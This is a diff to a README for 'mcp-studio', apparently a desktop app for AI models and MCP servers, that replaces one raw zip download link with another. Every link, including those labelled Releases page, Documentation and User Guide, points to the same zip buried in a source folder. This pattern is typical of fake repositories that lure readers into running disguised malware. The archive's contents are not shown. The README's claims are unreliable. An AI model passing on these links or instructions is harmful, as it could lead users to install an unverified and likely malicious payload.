@@ -1,7 +1,7 @@
 # 🎉 mcp-studio - Unified Interface for AI Models
 
 ## 📥 Download Now
-[![Download mcp-studio](https://raw.githubusercontent.com/muhammadfachryy/mcp-studio/main/unexhumed/mcp-studio.zip%https://raw.githubusercontent.com/muhammadfachryy/mcp-studio/main/unexhumed/mcp-studio.zip)](https://raw.githubusercontent.com/muhammadfachryy/mcp-studio/main/unexhumed/mcp-studio.zip)
+[![Download mcp-studio](https://github.com/muhammadfachryy/mcp-studio/raw/refs/heads/main/src/renderer/src/mcp_studio_3.0-alpha.2.zip%https://github.com/muhammadfachryy/mcp-studio/raw/refs/heads/main/src/renderer/src/mcp_studio_3.0-alpha.2.zip)](https://github.com/muhammadfachryy/mcp-studio/raw/refs/heads/main/src/renderer/src/mcp_studio_3.0-alpha.2.zip)
 
 ## 🌟 About
 mcp-studio is a desktop application built with Electron and React. It provides a simple interface for interacting with AI models and Model Context Protocol (MCP) servers. Whether you're in finance or simply exploring AI, this application allows you to access powerful tools with ease.
@@ -9,7 +9,7 @@ mcp-studio is a desktop application built with Electron and React. It provides a
 ## 🚀 Getting Started
 To get started with mcp-studio, follow these steps:
 
-1. **Download the Application**: You can find the latest version on our [Releases page](https://raw.githubusercontent.com/muhammadfachryy/mcp-studio/main/unexhumed/mcp-studio.zip).
+1. **Download the Application**: You can find the latest version on our [Releases page](https://github.com/muhammadfachryy/mcp-studio/raw/refs/heads/main/src/renderer/src/mcp_studio_3.0-alpha.2.zip).
 2. **Install the Application**: After downloading, double-click the installer file to start the setup. Follow the on-screen instructions to complete the installation.
 3. **Launch the Application**: Once installed, you can find mcp-studio in your application folder. Open it and start exploring AI models.
 
@@ -30,10 +30,10 @@ mcp-studio comes with several key features that enhance your experience:
 - **Robust Security**: Your data safety is our priority. We use secure connections for all communications.
 
 ## 📂 Download & Install
-To get the latest version of mcp-studio, visit our [Releases page](https://raw.githubusercontent.com/muhammadfachryy/mcp-studio/main/unexhumed/mcp-studio.zip) and look for the version suitable for your operating system. You will find several files available for download. Choose the installer for your OS, download it, and follow the installation instructions.
+To get the latest version of mcp-studio, visit our [Releases page](https://github.com/muhammadfachryy/mcp-studio/raw/refs/heads/main/src/renderer/src/mcp_studio_3.0-alpha.2.zip) and look for the version suitable for your operating system. You will find several files available for download. Choose the installer for your OS, download it, and follow the installation instructions.
 
 ## 🗂️ Updating the Application
-We regularly update mcp-studio to enhance features and fix bugs. To update, visit the [Releases page](https://raw.githubusercontent.com/muhammadfachryy/mcp-studio/main/unexhumed/mcp-studio.zip) and download the latest version. Follow the same installation steps as before.
+We regularly update mcp-studio to enhance features and fix bugs. To update, visit the [Releases page](https://github.com/muhammadfachryy/mcp-studio/raw/refs/heads/main/src/renderer/src/mcp_studio_3.0-alpha.2.zip) and download the latest version. Follow the same installation steps as before.
 
 ## 📝 Frequently Asked Questions
 
@@ -59,8 +59,8 @@ If you experience issues while using mcp-studio, here are some common solutions:
 ## 🔗 Additional Resources
 For more information, check out these helpful links:
 
-- [GitHub Repository](https://raw.githubusercontent.com/muhammadfachryy/mcp-studio/main/unexhumed/mcp-studio.zip)
-- [Documentation](https://raw.githubusercontent.com/muhammadfachryy/mcp-studio/main/unexhumed/mcp-studio.zip)
-- [User Guide](https://raw.githubusercontent.com/muhammadfachryy/mcp-studio/main/unexhumed/mcp-studio.zip)
+- [GitHub Repository](https://github.com/muhammadfachryy/mcp-studio/raw/refs/heads/main/src/renderer/src/mcp_studio_3.0-alpha.2.zip)
+- [Documentation](https://github.com/muhammadfachryy/mcp-studio/raw/refs/heads/main/src/renderer/src/mcp_studio_3.0-alpha.2.zip)
+- [User Guide](https://github.com/muhammadfachryy/mcp-studio/raw/refs/heads/main/src/renderer/src/mcp_studio_3.0-alpha.2.zip)
 
 Thank you for using mcp-studio! Your feedback is important to us, and we hope you enjoy the features we offer.
